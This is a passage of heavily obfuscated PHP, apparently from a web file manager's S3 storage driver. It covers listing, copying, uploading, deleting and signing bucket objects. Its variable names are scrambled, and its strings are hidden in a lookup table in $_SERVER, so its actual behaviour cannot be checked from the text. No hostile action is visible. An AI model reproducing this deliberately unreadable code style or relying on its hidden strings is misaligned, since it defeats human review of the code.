"\50\60\51{$ò¼×ÓÑğ}"; for ($ö°ÃşœÙ = 1; $ö°ÃşœÙ <= count($‹Öæºä´) + 1; $ö°ÃşœÙ++) { $¦ÔÒ¬š» = $¸öåä‡Ö . "\x28{$ö°ÃşœÙ}\51{$ò¼×ÓÑğ}"; if (!in_array_not_case($¦ÔÒ¬š», $‹Öæºä´)) { return $¦ÔÒ¬š»; } } return $¦ÔÒ¬š»; } public function listAllFiles($Â¶¢Š­, $–€ óÈ”, $Ó¨¥‚ñ¿ = array()) { $ñã‚‘êÃ =& $_SERVER[Ôó‡è­ƒ]; if (empty($–€ óÈ”)) { return array(); } $¼Ğ¬¿§Ã = array(); $Â¶¢Š­ = trim($Â¶¢Š­, $ñã‚‘êÃ[8]); foreach ($–€ óÈ” as $¹©ı§Çô) { $‡×›·ï = ltrim(substr(trim($¹©ı§Çô, $ñã‚‘êÃ[8]), strlen($Â¶¢Š­)), $ñã‚‘êÃ[8]); $¼Ğ¬¿§Ã = array_merge($¼Ğ¬¿§Ã, $this->slicePath($‡×›·ï)); } $†ÆµŸ = array(); foreach (array_unique($¼Ğ¬¿§Ã) as $¹©ı§Çô) { $å¼Ó†½ = array($ñã‚‘êÃ[78] => $this->getPathOuter($ñã‚‘êÃ[8] . $Â¶¢Š­ . $ñã‚‘êÃ[8] . $¹©ı§Çô), $ñã‚‘êÃ[79] => 1, $ñã‚‘êÃ[80] => 0); if (substr($¹©ı§Çô, -1) != $ñã‚‘êÃ[8]) { $å¼Ó†½[$ñã‚‘êÃ[79]] = 0; $ä„Âˆµã = $this->getPath($Â¶¢Š­ . $ñã‚‘êÃ[8] . $¹©ı§Çô); $å¼Ó†½[$ñã‚‘êÃ[80]] = isset($Ó¨¥‚ñ¿[$ä„Âˆµã]) ? $Ó¨¥‚ñ¿[$ä„Âˆµã] : $this->size($ä„Âˆµã); } $†ÆµŸ[] = $å¼Ó†½; } return $†ÆµŸ; } public function slicePath($äâùÕ»œ) { $³¶Ñ¥˜É =& $_SERVER[Ôó‡è­ƒ]; $©Û—êœ = explode($³¶Ñ¥˜É[8], trim($äâùÕ»œ, $³¶Ñ¥˜É[8])); $º¤Àêğ = 0; do { ++$º¤Àêğ; $è½’§Ì›[] = implode($³¶Ñ¥˜É[8], array_slice($©Û—êœ, 0, $º¤Àêğ)) . $³¶Ñ¥˜É[8]; } while ($º¤Àêğ < count($©Û—êœ)); $è½’§Ì›[count($©Û—êœ) - 1] = $äâùÕ»œ; return $è½’§Ì›; } public function getHost() { $‡»ËÂÄË =& $_SERVER[Ôó‡è­ƒ]; $¦Ç‰é®¿ = parse_url(trim($this->domain, $‡»ËÂÄË[8])); $Æ°¡¼’É = isset($¦Ç‰é®¿[$‡»ËÂÄË[177]]) ? $¦Ç‰é®¿[$‡»ËÂÄË[177]] : http_type(); $¤¸ó±†ö = isset($¦Ç‰é®¿[$‡»ËÂÄË[178]]) ? $¦Ç‰é®¿[$‡»ËÂÄË[178]] : $¦Ç‰é®¿[$‡»ËÂÄË[78]]; if (isset($¦Ç‰é®¿[$‡»ËÂÄË[179]])) { $¤¸ó±†ö .= $‡»ËÂÄË[4] . $¦Ç‰é®¿[$‡»ËÂÄË[179]]; } return $Æ°¡¼’É . $‡»ËÂÄË[180] . $¤¸ó±†ö; } public function pathEncode($ÓÄÄåÏÁ) { $Ï‘÷Ööó =& $_SERVER[Ôó‡è­ƒ]; return str_replace($Ï‘÷Ööó[181], $Ï‘÷Ööó[8], rawurlencode($ÓÄÄåÏÁ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($êá€ìŒŸ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ôó‡è­ƒ][182]; parent::__construct(); $this->_init($êá€ìŒŸ); } public function _init($É€×¸£Ç) { foreach ($É€×¸£Ç as $ï‡°Ãû => $ÛÚ«†¨) { if (isset($this->{$ï‡°Ãû})) { $this->{$ï‡°Ãû} = $ÛÚ«†¨; } } $this->endpoint = $É€×¸£Ç[$_SERVER[Ôó‡è­ƒ][183]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÛìÂ¡– = "\x76\64") { $this->signVer = $ÛìÂ¡–; $this->client->setSignatureVersion($ÛìÂ¡–); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¸äë¾Å =& $_SERVER[Ôó‡è­ƒ]; $æü™™Óƒ = $this->getBucketCors(); if (!$æü™™Óƒ || !is_array($æü™™Óƒ)) { return !1; } if ($æü™™Óƒ[$¸äë¾Å[184]] != $¸äë¾Å[185] || $æü™™Óƒ[$¸äë¾Å[186]] != $¸äë¾Å[185]) { return !1; } $™Õ»êäº = array_map($¸äë¾Å[187], $æü™™Óƒ[$¸äë¾Å[188]]); if (!is_array($™Õ»êäº)) { $™Õ»êäº = array(); } $ÎÏ†Ó€ä = array($¸äë¾Å[189], $¸äë¾Å[190], $¸äë¾Å[191], $¸äë¾Å[192], $¸äë¾Å[193]); $ÏƒîÁàƒ = array_diff($ÎÏ†Ó€ä, $™Õ»êäº); return empty($ÏƒîÁàƒ); } public function mkfile($ú ¯•², $ë¾¤›² = '', $­üÈ‡Çı = REPEAT_RENAME) { $¯©Ô­‚ = $this->setContent($ú ¯•², $ë¾¤›²); if ($¯©Ô­‚ !== !1) { return $this->getPathOuter($ú ¯•²); } return !1; } public function mkdir($ÛšŞƒã¿, $ØñÕ Íˆ = REPEAT_SKIP) { $‚Áşšœ =& $_SERVER[Ôó‡è­ƒ]; if (empty($ÛšŞƒã¿) && $ÛšŞƒã¿ !== $‚Áşšœ[194]) { return !1; } if ($this->_isFolder($ÛšŞƒã¿)) { return $this->getPathOuter($ÛšŞƒã¿); } $’Ú¾Ğ = $this->setContent($ÛšŞƒã¿, $‚Áşšœ[12], !0); if ($’Ú¾Ğ !== !1) { return $this->getPathOuter($ÛšŞƒã¿); } return !1; } public function copyFile($ÃÑƒÆ‹¥, $ÀïÈªüÏ, $Å¬¡İùĞ = array()) { $ûÌ“®ßÆ =& $_SERVER[Ôó‡è­ƒ]; $•ùš¯õ— = $this->objectMeta($ÃÑƒÆ‹¥); if (!$•ùš¯õ—) { return !1; } if ($•ùš¯õ—[$ûÌ“®ßÆ[80]] <= 1024 * 1024 * 200) { $ıù¼ÆÚ = $this->client->copyObject($this->bucket, $ÃÑƒÆ‹¥, $this->bucket, $ÀïÈªüÏ, $ûÌ“®ßÆ[195], $Å¬¡İùĞ); } else { $ıù¼ÆÚ = $this->client->multiCopyObject($this->bucket, $ÃÑƒÆ‹¥, $this->bucket, $ÀïÈªüÏ, $Å¬¡İùĞ); } $ıù¼ÆÚ = $ıù¼ÆÚ ? $this->getPathOuter($ÀïÈªüÏ) : !1; return $ıù¼ÆÚ; } public function moveFile($´ª”®³ó, $¥ƒ•–”·) { if ($this->copyFile($´ª”®³ó, $¥ƒ•–”·)) { $this->delFile($´ª”®³ó); return $this->getPathOuter($¥ƒ•–”·); } return !1; } public function delFile($­’®ï°¶) { return $this->client->deleteObject($this->bucket, $­’®ï°¶); } public function delFolder($¥ú™èÆ) { $êÁêá“’ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->exist($¥ú™èÆ)) { return !0; } $this->listItemCache = !1; $¶“µùŠÙ = $this->fileList($¥ú™èÆ); $this->listItemCache = !0; $İÀ“äŠÁ = trim($¥ú™èÆ, $êÁêá“’[8]) . $êÁêá“’[8]; if (!empty($¥ú™èÆ) && $¥ú™èÆ !== $êÁêá“’[194] && !in_array($İÀ“äŠÁ, $¶“µùŠÙ[$êÁêá“’[77]])) { $¶“µùŠÙ[$êÁêá“’[77]][] = $İÀ“äŠÁ; } $ñ›áòÓ® = $this->delByBatch($¶“µùŠÙ[$êÁêá“’[76]]); if (!$ñ›áòÓ®) { return !1; } $ñ›áòÓ® = $this->delByBatch($¶“µùŠÙ[$êÁêá“’[77]]); if (!$ñ›áòÓ®) { return !1; } return $this->delFile($İÀ“äŠÁ); } private function delByBatch($ôîœÆ¯) { foreach (array_chunk($ôîœÆ¯, 1000) as $ˆ¢è­Õó) { $Ã‚ê‘†½ = $this->client->deleteObjects($this->bucket, $ˆ¢è­Õó); if (!$Ã‚ê‘†½) { return !1; } } return !0; } public function rename($©õâµş, $û£¢üä¦) { return $this->renameObject($©õâµş, $û£¢üä¦); } public function listPath($¸·‡õ§, $…–ˆõ‚ = false) { $—÷’û›É =& $_SERVER[Ôó‡è­ƒ]; $ƒÆÁöóı = $this->fileList($¸·‡õ§, $—÷’û›É[8], !0); foreach ($ƒÆÁöóı[$—÷’û›É[77]] as $ôãÉ‚øì => $§ç±ÙÚ¹) { $ƒÆÁöóı[$—÷’û›É[77]][$ôãÉ‚øì] = $this->folderInfo($§ç±ÙÚ¹, $…–ˆõ‚); } foreach ($ƒÆÁöóı[$—÷’û›É[76]] as $ôãÉ‚øì => $§ç±ÙÚ¹) { $ƒÆÁöóı[$—÷’û›É[76]][$ôãÉ‚øì] = $this->fileInfo($§ç±ÙÚ¹[$—÷’û›É[32]], $…–ˆõ‚, $§ç±ÙÚ¹); } return $ƒÆÁöóı; } private function fileInfo($íŸØÀØ , $°ĞÆşĞ„ = false, $§Ÿ€ÑñÛ = array()) { $âèêÆÊ =& $_SERVER[Ôó‡è­ƒ]; $üİŠÑÖİ = array($âèêÆÊ[32] => $this->pathThis($íŸØÀØ ), $âèêÆÊ[78] => $this->getPathOuter($íŸØÀØ ), $âèêÆÊ[33] => $âèêÆÊ[196], $âèêÆÊ[171] => $this->ext($íŸØÀØ ), $âèêÆÊ[80] => isset($§Ÿ€ÑñÛ[$âèêÆÊ[80]]) ? $§Ÿ€ÑñÛ[$âèêÆÊ[80]] : 0); if ($°ĞÆşĞ„) { return $üİŠÑÖİ; } $üİŠÑÖİ[$âèêÆÊ[197]] = $üİŠÑÖİ[$âèêÆÊ[86]] = 0; $üİŠÑÖİ[$âèêÆÊ[198]] = $üİŠÑÖİ[$âèêÆÊ[199]] = !0; if (empty($§Ÿ€ÑñÛ)) { $§Ÿ€ÑñÛ = $this->objectMeta($íŸØÀØ ); if (!$§Ÿ€ÑñÛ) { return $üİŠÑÖİ; } } if (isset($§Ÿ€ÑñÛ[$âèêÆÊ[200]])) { $üİŠÑÖİ[$âèêÆÊ[86]] = $§Ÿ€ÑñÛ[$âèêÆÊ[200]]; } if (isset($§Ÿ€ÑñÛ[$âèêÆÊ[80]])) { $üİŠÑÖİ[$âèêÆÊ[80]] = $§Ÿ€ÑñÛ[$âèêÆÊ[80]]; } return $üİŠÑÖİ; } private function folderInfo($şÈ ²”, $ªÚ®ßÙ¯ = false) { $¡Ç´Şı¦ =& $_SERVER[Ôó‡è­ƒ]; $­œê°¶î = array($¡Ç´Şı¦[32] => $this->pathThis($şÈ ²”), $¡Ç´Şı¦[78] => $this->getPathOuter($¡Ç´Şı¦[8] . $şÈ ²”), $¡Ç´Şı¦[33] => $¡Ç´Şı¦[79]); if ($ªÚ®ßÙ¯) { return $­œê°¶î; } $­œê°¶î[$¡Ç´Şı¦[197]] = $­œê°¶î[$¡Ç´Şı¦[86]] = 0; $­œê°¶î[$¡Ç´Şı¦[198]] = $­œê°¶î[$¡Ç´Şı¦[199]] = !0; if ($şÈ ²” == $¡Ç´Şı¦[12]) { return $­œê°¶î; } $şÈ ²” = trim($şÈ ²”, $¡Ç´Şı¦[8]) . $¡Ç´Şı¦[8]; $›ÏşÊÃö = $this->objectMeta($şÈ ²”); if (isset($›ÏşÊÃö[$¡Ç´Şı¦[200]])) { $­œê°¶î[$¡Ç´Şı¦[197]] = $›ÏşÊÃö[$¡Ç´Şı¦[200]]; } return $­œê°¶î; } private function fileList($Ø©…û¨­, $òÙ™¶öÍ = '', $ã‘‰±× = 0) { $ï³’÷Ñ¨ =& $_SERVER[Ôó‡è­ƒ]; $­›­ôâ = rtrim($Ø©…û¨­, $ï³’÷Ñ¨[8]) . $ï³’÷Ñ¨[8]; $­ü©ˆŒ³ = $this->listObjs($­›­ôâ, null, null, $òÙ™¶öÍ); if (!$­ü©ˆŒ³) { return array($ï³’÷Ñ¨[77] => array(), $ï³’÷Ñ¨[76] => array()); } $ãˆ“ëè = $this->listItemCache === !1 ? !1 : !0; $á×üš¥¶ = $ÇÕ®ãŒ¹ = array(); foreach ($­ü©ˆŒ³[$ï³’÷Ñ¨[201]] as $èªÆº·’) { $êäıĞÕ… = $èªÆº·’[$ï³’÷Ñ¨[32]]; if ($êäıĞÕ… == $­›­ôâ) { continue; } $Ææ×Ã» = isset($èªÆº·’[$ï³’÷Ñ¨[80]]) ? $èªÆº·’[$ï³’÷Ñ¨[80]] : 0; $î°«ñúí = $Ææ×Ã» == 0 && substr($êäıĞÕ…, strlen($êäıĞÕ…) - 1, 1) == $ï³’÷Ñ¨[8] ? !0 : !1; if ($ãˆ“ëè) { $this->cacheMethod($ï³’÷Ñ¨[202], $êäıĞÕ…, $î°«ñúí); $this->cacheMethod($ï³’÷Ñ¨[203], $êäıĞÕ…, $èªÆº·’); } if ($î°«ñúí) { $á×üš¥¶[] = $êäıĞÕ…; continue; } $ÇÕ®ãŒ¹[] = $ã‘‰±× ? $èªÆº·’ : $êäıĞÕ…; } foreach ($­ü©ˆŒ³[$ï³’÷Ñ¨[204]] as $èªÆº·’) { $á×üš¥¶[] = $èªÆº·’[$ï³’÷Ñ¨[32]]; if ($ãˆ“ëè) { $this->cacheMethod($ï³’÷Ñ¨[202], $èªÆº·’[$ï³’÷Ñ¨[32]], !0); } } if ($ãˆ“ëè) { $this->cacheMethod($ï³’÷Ñ¨[202], $Ø©…û¨­, !0); } return array($ï³’÷Ñ¨[77] => $á×üš¥¶, $ï³’÷Ñ¨[76] => $ÇÕ®ãŒ¹); } private function listObjs($»ò„¤Ÿ, $¹¯ìˆõ“ = null, $¥ì¸êÄ = null, $„ıÆãåˆ = null) { $Á¾Èè•ò =& $_SERVER[Ôó‡è­ƒ]; $»ò„¤Ÿ = trim($»ò„¤Ÿ, $Á¾Èè•ò[8]); $‡Ãòõ¥Ğ = empty($»ò„¤Ÿ) && $»ò„¤Ÿ !== $Á¾Èè•ò[194] ? $Á¾Èè•ò[12] : $»ò„¤Ÿ . $Á¾Èè•ò[8]; return $this->client->getBucket($this->bucket, $‡Ãòõ¥Ğ, $¹¯ìˆõ“, $¥ì¸êÄ, $„ıÆãåˆ, !0); } public function has($Î†•ª¾¥, $¹“·›„ñ = false, $Ä®·çûª = true) { $„¹ÛÕ® =& $_SERVER[Ôó‡è­ƒ]; $Î†•ª¾¥ = trim($Î†•ª¾¥, $„¹ÛÕ®[8]); $…óì»í = empty($Î†•ª¾¥) && $Î†•ª¾¥ !== $„¹ÛÕ®[194] ? $„¹ÛÕ®[12] : $Î†•ª¾¥ . $„¹ÛÕ®[8]; $àíÙĞíş = null; $Õƒ¢°À¤ = 500; $É¾æÔóå = $„¹ÛÕ®[8]; $™Ü­³ÉË = $£–µ›İà = array(); while (!0) { $ğí”ş’´ = $this->listObjs($Î†•ª¾¥, $àíÙĞíş, $Õƒ¢°À¤, $É¾æÔóå); if (!$ğí”ş’´) { break; } $àíÙĞíş = $ğí”ş’´[$„¹ÛÕ®[205]]; $Æ£¤è£… = $ğí”ş’´[$„¹ÛÕ®[201]]; $ì ¦‚èÍ = $ğí”ş’´[$„¹ÛÕ®[204]]; if (empty($Æ£¤è£…) && empty($ì ¦‚èÍ)) { break; } if (count($Æ£¤è£…) == 1 && $Æ£¤è£…[0][$„¹ÛÕ®[32]] == $…óì»í) { break; } if ($¹“·›„ñ) { if (count($Æ£¤è£…)) { $Æ£¤è£… = array_column($Æ£¤è£…, $„¹ÛÕ®[32]); $™Ü­³ÉË = array_merge($™Ü­³ÉË, $Æ£¤è£…); } if (count($ì ¦‚èÍ)) { $ì ¦‚èÍ = array_column($ì ¦‚èÍ, $„¹ÛÕ®[32]); $£–µ›İà = array_merge($£–µ›İà, $ì ¦‚èÍ); } if ($àíÙĞíş === null) { break; } continue; } if ($Ä®·çûª) { if (!empty($Æ£¤è£…)) { if (count($Æ£¤è£…) > 1 || isset($Æ£¤è£…[0][$„¹ÛÕ®[32]]) && $Æ£¤è£…[0][$„¹ÛÕ®[32]] != $…óì»í) { return !0; } } } else { if (!empty($ì ¦‚èÍ)) { return !0; } } if ($àíÙĞíş === null) { break; } } if ($¹“·›„ñ) { $™Ü­³ÉË = array_diff($™Ü­³ÉË, array($…óì»í)); $™Ü­³ÉË = count(array_unique($™Ü­³ÉË)); $£–µ›İà = count(array_unique($£–µ›İà)); return array($„¹ÛÕ®[206] => $™Ü­³ÉË, $„¹ÛÕ®[207] => $£–µ›İà); } return !1; } public function listAll($à÷úõÊ”) { $¥ã‹ù¥Ó =& $_SERVER[Ôó‡è­ƒ]; $Á–á¯ò = $this->fileList($à÷úõÊ”, $¥ã‹ù¥Ó[12], !0); $·»Òøæ€ = array(); foreach ($Á–á¯ò[$¥ã‹ù¥Ó[76]] as $™»°Ó™ø) { $·»Òøæ€[$™»°Ó™ø[$¥ã‹ù¥Ó[32]]] = $™»°Ó™ø[$¥ã‹ù¥Ó[80]]; } foreach ($Á–á¯ò[$¥ã‹ù¥Ó[77]] as $™»°Ó™ø) { if (is_string($™»°Ó™ø)) { $·»Òøæ€[$™»°Ó™ø] = 0; } } return $this->listAllFiles($à÷úõÊ”, array_keys($·»Òøæ€), $·»Òøæ€); } public function canRead($µÀ¥©È ) { $‹ŒõÃ“÷ =& $_SERVER[Ôó‡è­ƒ]; $Æõ¿Í‡É = $this->client->getAccessControlPolicy($this->bucket, $µÀ¥©È ); if (!$Æõ¿Í‡É) { return !1; } return in_array($Æõ¿Í‡É, array($‹ŒõÃ“÷[208], $‹ŒõÃ“÷[209], $‹ŒõÃ“÷[210])) ? !0 : !1; } public function canWrite($Ş’ïßˆ°) { $ŸÃ”ú†Ê =& $_SERVER[Ôó‡è­ƒ]; $Æã¦¡šï = $this->client->getAccessControlPolicy($this->bucket, $Ş’ïßˆ°); if (!$Æã¦¡šï) { return !1; } return in_array($Æã¦¡šï, array($ŸÃ”ú†Ê[208], $ŸÃ”ú†Ê[209])) ? !0 : !1; } public function getContent($İ«°Ñ—Ğ) { return $this->client->getObject($this->bucket, $İ«°Ñ—Ğ); } public function setContent($òèˆ€ÄŒ, $‚ãœÊˆÔ = '', $Ãç‡²Š = false) { $›Ë´äŒ =& $_SERVER[Ôó‡è­ƒ]; $òèˆ€ÄŒ = $Ãç‡²Š ? trim($òèˆ€ÄŒ, $›Ë´äŒ[8]) . $›Ë´äŒ[8] : $òèˆ€ÄŒ; $¾ºÂÕ£Ï = get_file_mime(get_path_ext($òèˆ€ÄŒ)); $Ÿ­¨éÈ¸ = $this->client->putObject($‚ãœÊˆÔ, $this->bucket, $òèˆ€ÄŒ, $›Ë´äŒ[195], array(), $¾ºÂÕ£Ï); if (!$Ÿ­¨éÈ¸) { return !1; } if ($Ãç‡²Š) { return !0; } $this->cacheMethod(null, null); $Ÿ­¨éÈ¸ = $this->copyFile($òèˆ€ÄŒ, $òèˆ€ÄŒ, array($›Ë´äŒ[211] => $Ÿ­¨éÈ¸[$›Ë´äŒ[212]])); return $Ÿ­¨éÈ¸ ? !0 : !1; } public function fileSubstr($Åİ™Á¼”, $æßã²“Š, $ÓÖÂÉÛ) { $Çò²ã‚— = $æßã²“Š + $ÓÖÂÉÛ - 1; return $this->client->getObject($this->bucket, $Åİ™Á¼”, array($_SERVER[Ôó‡è­ƒ][213] => "\142\x79\x74\145\x73\75{$æßã²“Š}\55{$Çò²ã‚—}")); } public function upload($½”—˜, $Õ§¥¥Ëò, $®éô‹ÈÚ = false, $„Š·³êÏ = REPEAT_REPLACE) { $¬ğ¼® =& $_SERVER[Ôó‡è­ƒ]; $—ì·ìæ¦ = array($¬ğ¼®[211] => @md5_file($Õ§¥¥Ëò)); $Š‰Ì­ƒ– = array($¬ğ¼®[214] => get_file_mime(get_path_ext($½”—˜))); if (IO::size($Õ§¥¥Ëò) <= 1024 * 1024 * 200) { $åÀ¸Æéë = $this->client->putObjectFile($Õ§¥¥Ëò, $this->bucket, $½”—˜, $¬ğ¼®[195], $—ì·ìæ¦, $Š‰Ì­ƒ–); return !empty($åÀ¸Æéë) ? $this->getPathOuter($½”—˜) : !1; } $æè¼šÍâ = $this->client->multiUploadObject($Õ§¥¥Ëò, $this->bucket, trim($½”—˜, $¬ğ¼®[8]), $—ì·ìæ¦, $Š‰Ì­ƒ–); return $æè¼šÍâ ? $this->getPathOuter($½”—˜) : !1; } public function download($¶²»„Íµ, $øËşè¹) { if (!@is_dir($this->pathFather($øËşè¹)) && !IO::mkdir($this->pathFather($øËşè¹))) { return !1; } $–Ö·åı¯ = $this->client->getObject($this->bucket, $¶²»„Íµ, array(), $øËşè¹); return $–Ö·åı¯ !== !1 ? $øËşè¹ : !1; } public function link($€Ã¨»ˆ³, $§Ë«÷•Ä = array()) { $è¸™åÔ• =& $_SERVER[Ôó‡è­ƒ]; if ($this->signVer == $è¸™åÔ•[215]) { return $this->client->getAuthenticatedURL($this->bucket, $€Ã¨»ˆ³, 3600 * 12, $§Ë«÷•Ä); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($€Ã¨»ˆ³, $è¸™åÔ•[8]), 3600 * 12, $this->region, array(), !0, $§Ë«÷•Ä); } public function fileOut($ßı¢ìïò, $˜Ü­’©« = false, $é´ïÄ¸² = false, $áîÚ–Ü³ = '') { $Üö•²Û‡ =& $_SERVER[Ôó‡è­ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ßı¢ìïò, $˜Ü­’©«, $é´ïÄ¸², $áîÚ–Ü³); } if (!$é´ïÄ¸²) { $é´ïÄ¸² = $this->pathThis($ßı¢ìïò); } $ÙÀ¼Ÿãú = get_file_mime(get_path_ext($é´ïÄ¸²)); if ($ÙÀ¼Ÿãú == $Üö•²Û‡[216]) { return parent::fileOut($ßı¢ìïò, $˜Ü­’©«, $é´ïÄ¸², $áîÚ–Ü³); } $ıò¼ŠÒ” = array($Üö•²Û‡[217] => $ÙÀ¼Ÿãú); if ($˜Ü­’©«) { $ıò¼ŠÒ”[$Üö•²Û‡[218]] = $Üö•²Û‡[219] . rawurlencode($é´ïÄ¸²); } else { } $š°èé‘ = $this->link($ßı¢ìïò, $ıò¼ŠÒ”); $this->fileOutLink($š°èé‘); } public function fileOutServer($ãÈÙŠú”, $×ëİ±±í = false, $˜‹…—® = false, $ÌïÙÃ†ó = '') { parent::fileOut($ãÈÙŠú”, $×ëİ±±í, $˜‹…—®, $ÌïÙÃ†ó); } public function fileOutImageServer($øÊÕïş¾, $ğ…¤ĞîŸ = 250) { parent::fileOutImage($øÊÕïş¾, $ğ…¤ĞîŸ); } public function hashMd5($»¦Ç½­â, $ìÓÔê™ã = '') { $¶³øŸÄœ =& $_SERVER[Ôó‡è­ƒ]; $ªĞ€Ñ®Ã = $this->objectMeta($»¦Ç½­â); if (!$ªĞ€Ñ®Ã) { return !1; } $ìÓÔê™ã = $ìÓÔê™ã ? $ìÓÔê™ã : _get($ªĞ€Ñ®Ã, $¶³øŸÄœ[220]); $ìÓÔê™ã = $ìÓÔê™ã ? $ìÓÔê™ã : _get($ªĞ€Ñ®Ã, $¶³øŸÄœ[212], $¶³øŸÄœ[12]); return $ìÓÔê™ã; } public function uploadFormData($ã°¼ğ¼÷, $‚öÛÃœ = 3600) { $ÎèØ¬ôÑ =& $_SERVER[Ôó‡è­ƒ]; $íÑ»Î™ = $this->pathFather($ã°¼ğ¼÷); $û‡éÇ«‡ = $this->client->getHttpUploadPostParams($this->bucket, $íÑ»Î™, $ÎèØ¬ôÑ[195], $‚öÛÃœ); return array_merge((array) $û‡éÇ«‡, array($ÎèØ¬ôÑ[178] => $this->getHost())); } public function multiUploadFormData($õ¨Üá¸†, $°“‹ˆ€Ò = 3600) { $Ì¦ÕºèŞ =& $_SERVER[Ôó‡è­ƒ]; $Õâøæü = gmdate($Ì¦ÕºèŞ[221]); $’Ğ½Ş‘ = array(); $İ¤ñĞğ = $this->client->getUploadId($this->bucket, $õ¨Üá¸†, $’Ğ½Ş‘); if (!$İ¤ñĞğ) { return !1; } return array($Ì¦ÕºèŞ[222] => $İ¤ñĞğ, $Ì¦ÕºèŞ[178] => $this->getHost() . $Ì¦ÕºèŞ[8] . $this->pathEncode($õ¨Üá¸†), $Ì¦ÕºèŞ[223] => $Õâøæü, $Ì¦ÕºèŞ[95] => $õ¨Üá¸†); } public function multiUploadAuthData($ €ü“×, $­òŞü¨ = array()) { $«ùÄ÷É =& $_SERVER[Ôó‡è­ƒ]; $½®­§Ø = isset($­òŞü¨[$«ùÄ÷É[223]]) ? $­òŞü¨[$«ùÄ÷É[223]] : gmdate($«ùÄ÷É[221]); $‚¤£Ÿˆ› = isset($­òŞü¨[$«ùÄ÷É[171]]) ? $­òŞü¨[$«ùÄ÷É[171]] : $«ùÄ÷É[12]; $¦ÉûŞ = $­òŞü¨[$«ùÄ÷É[95]]; unset($­òŞü¨[$«ùÄ÷É[95]]); if (isset($­òŞü¨[$«ùÄ÷É[224]])) { $­òŞü¨[$«ùÄ÷É[223]] = $½®­§Ø; return $this->listUploadParts($¦ÉûŞ, $­òŞü¨); } $–í¸éü„ = array($«ùÄ÷É[225], $«ùÄ÷É[12], $«ùÄ÷É[121], $«ùÄ÷É[12], "\170\x2d\x61\x6d\172\x2d\144\141\x74\x65\72{$½®­§Ø}", $«ùÄ÷É[8] . $this->bucket . $«ùÄ÷É[8] . $this->pathEncode($¦ÉûŞ) . $‚¤£Ÿˆ›); if (strpos($‚¤£Ÿˆ›, $«ùÄ÷É[226]) === 0) { $–í¸éü„[0] = $«ùÄ÷É[227]; } if (isset($­òŞü¨[$«ùÄ÷É[228]]) && $­òŞü¨[$«ùÄ÷É[228]] == $«ùÄ÷É[229]) { $–í¸éü„[0] = $«ùÄ÷É[229]; } $Æ ºå‘ = implode($«ùÄ÷É[230], $–í¸éü„); $­Âò´Ã„ = base64_encode(hash_hmac($«ùÄ÷É[231], $Æ ºå‘, $this->secret, !0)); $·óÊµò‘ = $«ùÄ÷É[232] . $this->accessKey . $«ùÄ÷É[4] . $­Âò´Ã„; if (strpos($‚¤£Ÿˆ›, $«ùÄ÷É[226]) === 0) { return array($«ùÄ÷É[233] => $·óÊµò‘, $«ùÄ÷É[223] => $½®­§Ø); } return $·óÊµò‘; } public function listUploadParts($—âàÌ”ñ, $—Èé·Í = array()) { $Úòã¼¬¾ =& $_SERVER[Ôó‡è­ƒ]; $¡–Ûëáö = str_replace($Úòã¼¬¾[234], $Úòã¼¬¾[12], $—Èé·Í[$Úòã¼¬¾[171]]); $†Îøï¤Ü = $this->client->listParts($this->bucket, $—âàÌ”ñ, $¡–Ûëáö); if (!$†Îøï¤Ü) { return !1; } unset($—Èé·Í[$Úòã¼¬¾[224]], $—Èé·Í[$Úòã¼¬¾[228]]); $—Èé·Í[$Úòã¼¬¾[95]] = $—âàÌ”ñ; $Çà¹Ëñ³ = $this->multiUploadAuthData($—âàÌ”ñ, $—Èé·Í); if (empty($Çà¹Ëñ³)) { return !1; } return array($Úòã¼¬¾[233] => $Çà¹Ëñ³, $Úòã¼¬¾[223] => $—Èé·Í[$Úòã¼¬¾[223]], $Úòã¼¬¾[235] => $†Îøï¤Ü); } public function getHost() { return parent::getHost() . $_SERVER[Ôó‡è­ƒ][8] . $this->bucket; } public function size($ÅœªÀƒ§) { $¦¤õîÌ” = $this->objectMeta($ÅœªÀƒ§); return $¦¤õîÌ” ? $¦¤õîÌ”[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function info($­ñÊŞ°¡) { if ($this->isFolder($­ñÊŞ°¡)) { return $this->folderInfo($­ñÊŞ°¡); } else { if ($this->isFile($­ñÊŞ°¡)) { return $this->fileInfo($­ñÊŞ°¡); } } return !1; } public function exist($ì®òìÚ©) { return $this->isFile($ì®òìÚ©) || $this->isFolder($ì®òìÚ©); } public function isFile($…Îã½¤œ) { return !$this->isFolder($…Îã½¤œ) && $this->objectMeta($…Îã½¤œ); } public function isFolder($úØÅ×¾ö) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][202], $úØÅ×¾ö); } protected function objectMeta($ø¡ñŸş×) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][203], $ø¡ñŸş×); } protected function _objectMeta($ñÍ™ÊÃº) { $´ìÎàê® =& $_SERVER[Ôó‡è­ƒ]; $ñÍ™ÊÃº = rtrim($ñÍ™ÊÃº, $´ìÎàê®[8]); try { $èØõº¤ = $this->client->getObjectInfo($this->bucket, $ñÍ™ÊÃº); if (!isset($èØõº¤[$´ìÎàê®[220]]) && isset($èØõº¤[$´ìÎàê®[236]])) { $èØõº¤[$´ìÎàê®[220]] = $èØõº¤[$´ìÎàê®[236]]; } } catch (Exception $ºì§—Å) { $èØõº¤ = !1; } if (!$èØõº¤) { } return $èØõº¤; } protected function _isFolder($¼ª…Öèû) { $®¬Ñ•³ =& $_SERVER[Ôó‡è­ƒ]; $¼ª…Öèû = rtrim($¼ª…Öèû, $®¬Ñ•³[8]); if ($¼ª…Öèû == $®¬Ñ•³[12] || $¼ª…Öèû == $®¬Ñ•³[8]) { return !0; } $ä°Ò›©‘ = $this->client->getBucket($this->bucket, $¼ª…Öèû, null, 1); if (empty($ä°Ò›©‘[$®¬Ñ•³[201]])) { return !1; } $İº²ÁåÕ 